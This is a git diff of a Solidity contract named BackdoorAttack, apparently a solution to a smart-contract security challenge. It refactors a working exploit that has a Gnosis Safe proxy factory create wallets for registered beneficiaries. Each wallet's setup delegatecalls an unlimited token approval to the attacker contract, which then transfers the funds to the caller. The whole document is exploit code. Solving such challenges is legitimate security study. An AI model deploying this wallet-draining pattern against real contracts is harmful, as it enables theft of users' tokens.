@@ -11,61 +11,61 @@ contract BackdoorAttack{
 
     address immutable singleton;
     IERC20 immutable token;
-    IProxyCreationCallback immutable registry;
     GnosisSafeProxyFactory immutable factory;
-
+    IProxyCreationCallback immutable registry;
 
     constructor(
         address _singleton,
         address _token,
-        address _registry,
-        address _factory
+        address _factory,
+        address _registry
     ) {
         singleton = _singleton;
         token = IERC20(_token);
-        registry = IProxyCreationCallback(_registry);
         factory = GnosisSafeProxyFactory(_factory);
+        registry = IProxyCreationCallback(_registry);
     }
 
-    function approve(address _sender) external{
-        token.approve(_sender, type(uint256).max);
+    //approve function for the delegatecall
+    function approve(address _user, uint256 _amount) external {
+        token.approve(_user, _amount);
     }
 
-    function attack(address[] calldata _users, uint256 _amount) external {
+    //action
+    function attack(address[] calldata _users, uint _amount) external {
 
-        //create loop to cycle through all users in array
-        for (uint256 i = 0; i < _users.length; i++) {
-            address[] memory arr = new address[](1);
-            arr[0] = _users[i];
+        //create array for the wallets
+        for (uint256 i; i < _users.length; ++i){
+            address[] memory wallets = new address[](1);
 
-            //create approve payload
-            bytes memory _approvePayload = abi.encodeWithSignature("approve(address)", address(this));
-
-            //create setup 
-            bytes memory setup = abi.encodeWithSelector(
-                GnosisSafe.setup.selector,
-                arr, 
-                uint256(1), 
-                address(this), 
-                _approvePayload, 
-                address(0), 
-                address(0), 
-                uint256(0), 
-                address(0)
-            );
-            //create new proxy contract and trigger approve through the delegatecall to attacker contract
-            GnosisSafeProxy proxy = factory.createProxyWithCallback(
-                singleton, 
-                setup, 
-                block.timestamp, 
-                registry);
-
-            //tranfer funds from new proxy
-            token.transferFrom(address(proxy), msg.sender, _amount);
-        }
+            wallets[0] = _users[i];
         
+
+        //create a approve payload
+        bytes memory _approvePayload = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
+
+        //create the setup for initializer
+        bytes memory setup = abi.encodeWithSelector(
+            GnosisSafe.setup.selector,
+            wallets, 
+            uint(1), 
+            address(this), 
+            _approvePayload, 
+            address(0), 
+            address(0), 
+            uint(0), 
+            address(0)
+            );
+
+        //create a proxy and trigger delegatecall
+        GnosisSafeProxy proxy = factory.createProxyWithCallback(
+            singleton, 
+            setup, 
+            block.timestamp, 
+            registry);
+
+        //transfer tokens for proxy
+        token.transferFrom(address(proxy), msg.sender, _amount);
+        }
     }
-
 }
-
-
